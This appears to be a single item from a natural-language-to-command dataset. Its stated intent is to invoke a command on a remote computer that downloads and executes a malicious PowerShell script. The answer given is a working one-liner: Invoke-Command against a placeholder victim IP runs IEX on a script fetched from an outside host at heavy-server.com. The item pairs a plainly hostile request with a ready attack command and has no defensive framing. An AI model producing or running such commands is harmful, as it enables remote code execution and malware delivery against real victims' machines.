# Natural language intent:
# Invoke a command on a remote computer to download and execute a malicious PowerShell script.

Invoke-Command -ComputerName <Victim IP> -ScriptBlock {IEX (New-Object Net.Webclient).DownloadString('http://heavy-server.com/malware.ps1')}
